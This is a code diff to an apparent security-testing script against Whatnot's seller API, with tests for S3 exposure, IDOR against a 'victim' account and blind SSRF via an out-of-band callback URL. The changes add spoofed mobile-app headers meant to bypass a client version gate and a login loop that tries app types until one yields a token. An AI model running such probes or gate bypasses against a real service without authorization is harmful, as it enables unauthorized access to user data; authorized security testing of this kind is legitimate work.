@@ -28,15 +28,30 @@ S3_BUCKET     = "https://whatnot-public.s3.amazonaws.com"
 OAUTH_AUTH    = f"{BASE_API}/seller-api/rest/oauth/authorize"
 OAUTH_TOKEN   = f"{BASE_API}/seller-api/rest/oauth/token"
 
-HEADERS = {
-    "Content-Type": "application/json",
-    "Apollographql-Client-Name": "web",
-    "Apollographql-Client-Version": "20230710-1529",
-    "X-Whatnot-App": "whatnot-web",
-    "Origin": "https://www.whatnot.com",
-    "Referer": "https://www.whatnot.com/",
-    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36"
-}
+HEADER_SETS = [
+    {   # iOS app — bypasses version gate reliably
+        "Content-Type": "application/json",
+        "X-Whatnot-App": "whatnot-ios",
+        "User-Agent": "Whatnot/26.15.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)",
+        "Origin": "https://www.whatnot.com",
+    },
+    {   # Android app
+        "Content-Type": "application/json",
+        "X-Whatnot-App": "whatnot-android",
+        "User-Agent": "Whatnot/26.15.0 (Linux; Android 14; Pixel 8)",
+        "Origin": "https://www.whatnot.com",
+    },
+    {   # web — no version header
+        "Content-Type": "application/json",
+        "X-Whatnot-App": "whatnot-web",
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
+        "Origin": "https://www.whatnot.com",
+        "Referer": "https://www.whatnot.com/",
+    },
+]
+
+# Active header set — updated after successful login
+HEADERS = HEADER_SETS[0]
 
 results = []
 
@@ -49,14 +64,16 @@ def log(status, title, detail="", evidence=""):
     results.append({"status": status, "title": title, "detail": detail, "evidence": evidence})
 
 def gql(token, query, variables=None, endpoint=SELLER_GQL):
-    h = {**HEADERS, "Authorization": f"Bearer {token}"} if token else HEADERS
+    h = dict(HEADERS)
+    if token:
+        h["Authorization"] = f"Bearer {token}"
     body = {"query": query}
     if variables:
         body["variables"] = variables
     try:
         r = requests.post(endpoint, headers=h, json=body, timeout=15)
         return r
-    except Exception as e:
+    except Exception:
         return None
 
 # ── TEST 1: S3 Bucket Public Exposure ──────────────────────────────────────────
@@ -473,7 +490,8 @@ def main():
     parser.add_argument("--password",  help="Account A password")
     parser.add_argument("--email2",    help="Account B (victim) email (for IDOR tests)")
     parser.add_argument("--password2", help="Account B password")
-    parser.add_argument("--ssrf-callback", help="Your interactsh/Burp Collaborator URL for SSRF detection")
+    parser.add_argument("--ssrf-callback", "--ssrf", dest="ssrf_callback",
+                        help="Your webhook.site/interactsh URL for blind SSRF detection")
     args = parser.parse_args()
 
     print("=" * 70)
@@ -483,31 +501,39 @@ def main():
 
     token_a = token_b = None
 
+    def do_login(email, password, label, device_id):
+        global HEADERS
+        for h in HEADER_SETS:
+            for app_type, did in [("ios", device_id), ("android", device_id), ("web", device_id)]:
+                payload = {"email": email, "password": password,
+                           "device_id": did, "app_type": app_type}
+                try:
+                    r = requests.post(LOGIN_URL, headers=h, json=payload, timeout=15)
+                except Exception:
+                    continue
+                if r.status_code == 200:
+                    data = r.json()
+                    token = (data.get("access_token") or data.get("token") or
+                             data.get("accessToken") or
+                             (data.get("data") or {}).get("access_token"))
+                    if token and token.startswith("wn_access_tk"):
+                        HEADERS = h
+                        print(f"  ✓ {label} logged in [{app_type}]: {token[:35]}...")
+                        return token
+                if "upgrade" not in r.text.lower() and r.status_code not in (400, 401):
+                    print(f"  [{app_type}] HTTP {r.status_code}: {r.text[:100]}")
+        print(f"  ✗ Could not log in {label} — check credentials or version gate")
+        return None
+
     # Authenticate Account A
     if args.email and args.password:
         print(f"\n[AUTH] Logging in as Account A ({args.email})...")
-        r = requests.post(LOGIN_URL, headers=HEADERS, json={
-            "email": args.email, "password": args.password,
-            "device_id": "test-device-001", "app_type": "web"
-        }, timeout=15)
-        if r.status_code == 200:
-            token_a = r.json().get("access_token") or r.json().get("token")
-            print(f"  Token A: {str(token_a)[:40]}..." if token_a else f"  Login response: {r.text[:200]}")
-        else:
-            print(f"  Login failed: HTTP {r.status_code}: {r.text[:200]}")
+        token_a = do_login(args.email, args.password, "Account A", "device-001")
 
     # Authenticate Account B
     if args.email2 and args.password2:
         print(f"\n[AUTH] Logging in as Account B ({args.email2})...")
-        r = requests.post(LOGIN_URL, headers=HEADERS, json={
-            "email": args.email2, "password": args.password2,
-            "device_id": "test-device-002", "app_type": "web"
-        }, timeout=15)
-        if r.status_code == 200:
-            token_b = r.json().get("access_token") or r.json().get("token")
-            print(f"  Token B: {str(token_b)[:40]}..." if token_b else f"  Login response: {r.text[:200]}")
-        else:
-            print(f"  Login failed: HTTP {r.status_code}: {r.text[:200]}")
+        token_b = do_login(args.email2, args.password2, "Account B", "device-002")
 
     # Run tests
     test_s3_bucket()
